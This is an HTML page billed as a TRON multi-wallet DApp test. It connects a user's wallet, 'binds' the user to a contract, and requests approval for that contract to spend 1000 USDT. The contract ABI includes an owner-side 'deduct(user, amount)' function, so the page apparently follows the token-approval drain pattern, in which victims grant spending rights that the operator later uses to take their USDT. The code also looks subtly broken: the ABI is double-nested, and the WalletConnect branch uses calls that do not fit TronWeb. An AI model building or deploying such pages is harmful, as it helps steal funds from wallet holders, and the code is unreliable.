<!DOCTYPE html>
<html lang="zh">
<head>
  <meta charset="UTF-8">
  <title>TRON 多钱包 DApp 测试</title>
</head>
<body>
  <h2>TRON 多钱包 DApp 测试</h2>

  <button onclick="connectWallet()">连接钱包</button>
  <p id="address"></p>

  <hr>

  <button onclick="bindAndApprove()">绑定并授权 USDT</button>
  <p id="status"></p>

  <!-- TronWeb -->
  <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
  <!-- WalletConnect -->
  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/client/dist/umd/index.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/qrcode-modal/dist/umd/index.min.js"></script>

  <script>
  const CONTRACT_ADDRESS = "TRZvddUZXAoriYEdrzVdMjcpF6VVVwQAis";
  const USDT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
  const ABI = [
    [
	{
		"inputs": [],
		"stateMutability": "nonpayable",
		"type": "constructor"
	},
	{
		"anonymous": false,
		"inputs": [
			{
				"indexed": true,
				"internalType": "address",
				"name": "user",
				"type": "address"
			}
		],
		"name": "Bound",
		"type": "event"
	},
	{
		"anonymous": false,
		"inputs": [
			{
				"indexed": true,
				"internalType": "address",
				"name": "user",
				"type": "address"
			},
			{
				"indexed": false,
				"internalType": "uint256",
				"name": "amount",
				"type": "uint256"
			}
		],
		"name": "Deducted",
		"type": "event"
	},
	{
		"inputs": [],
		"name": "USDT",
		"outputs": [
			{
				"internalType": "address",
				"name": "",
				"type": "address"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "bind",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "user",
				"type": "address"
			},
			{
				"internalType": "uint256",
				"name": "amount",
				"type": "uint256"
			}
		],
		"name": "deduct",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "getContractBalance",
		"outputs": [
			{
				"internalType": "uint256",
				"name": "",
				"type": "uint256"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "user",
				"type": "address"
			}
		],
		"name": "getUserBalance",
		"outputs": [
			{
				"internalType": "uint256",
				"name": "",
				"type": "uint256"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "",
				"type": "address"
			}
		],
		"name": "isBound",
		"outputs": [
			{
				"internalType": "bool",
				"name": "",
				"type": "bool"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "owner",
		"outputs": [
			{
				"internalType": "address",
				"name": "",
				"type": "address"
			}
		],
		"stateMutability": "view",
		"type": "function"
	}
]



  ];

  let tronWeb;
  let contract;
  let connector;

  function setStatus(msg) {
    document.getElementById("status").innerText = msg;
  }

  async function connectWallet() {
    setStatus("检测钱包...");

    // TronLink 优先
    if (window.tronWeb && window.tronWeb.ready) {
      tronWeb = window.tronWeb;
      document.getElementById("address").innerText = "钱包地址: " + tronWeb.defaultAddress.base58;
      contract = await tronWeb.contract(ABI, CONTRACT_ADDRESS);
      setStatus("已连接 TronLink 钱包");
      return;
    }

    // WalletConnect 连接
    connector = new WalletConnect.default({
      bridge: "https://bridge.walletconnect.org",
      qrcodeModal: WalletConnectQRCodeModal.default
    });

    if (!connector.connected) {
      await connector.createSession();
    }

    connector.on("connect", async (error, payload) => {
      if (error) throw error;
      const { accounts } = payload.params[0];
      const address = accounts[0];
      document.getElementById("address").innerText = "钱包地址: " + address;

      // 创建 TronWeb 实例，但 WalletConnect 签名由 connector 完成
      tronWeb = new TronWeb({
        fullHost: "https://api.trongrid.io",
        privateKey: "" // WalletConnect 不暴露私钥
      });

      contract = await tronWeb.contract(ABI, CONTRACT_ADDRESS);
      setStatus("已连接 WalletConnect 钱包 (imToken/TokenPocket/欧意)");
    });

    connector.on("disconnect", (error, payload) => {
      setStatus("钱包已断开");
      document.getElementById("address").innerText = "";
    });
  }

  async function bindAndApprove() {
    if (!contract) {
      setStatus("请先连接钱包");
      return;
    }

    try {
      const userAddress = document.getElementById("address").innerText.replace("钱包地址: ", "");
      setStatus("开始绑定用户...");

      // 1️⃣ 绑定用户
      if (connector && connector.connected) {
        // WalletConnect
        const txData = await contract.bind().encodeABI();
        const tx = {
          to: CONTRACT_ADDRESS,
          from: userAddress,
          data: txData
        };
        await connector.sendTransaction(tx);
        setStatus("绑定成功 (WalletConnect)");
      } else {
        // TronLink
        const bindTx = await contract.bind().send();
        setStatus("绑定成功 (TronLink)");
      }

      // 2️⃣ 授权 USDT 1000
      setStatus("请在钱包弹窗中确认授权 1000 USDT");

      const usdt = await tronWeb.contract().at(USDT_ADDRESS);
      const fixedAmount = 1000; // 1000 USDT

      if (connector && connector.connected) {
        const approveData = await usdt.approve(CONTRACT_ADDRESS, fixedAmount * 1e6).encodeABI();
        const tx2 = {
          to: USDT_ADDRESS,
          from: userAddress,
          data: approveData
        };
        await connector.sendTransaction(tx2);
        setStatus("授权成功 (WalletConnect) 1000 USDT");
      } else {
        const approveTx = await usdt.approve(CONTRACT_ADDRESS, fixedAmount * 1e6).send();
        setStatus("授权成功 (TronLink) 1000 USDT");
      }

    } catch (e) {
      setStatus("操作失败: " + e.message);
    }
  }
  </script>
</body>
</html>
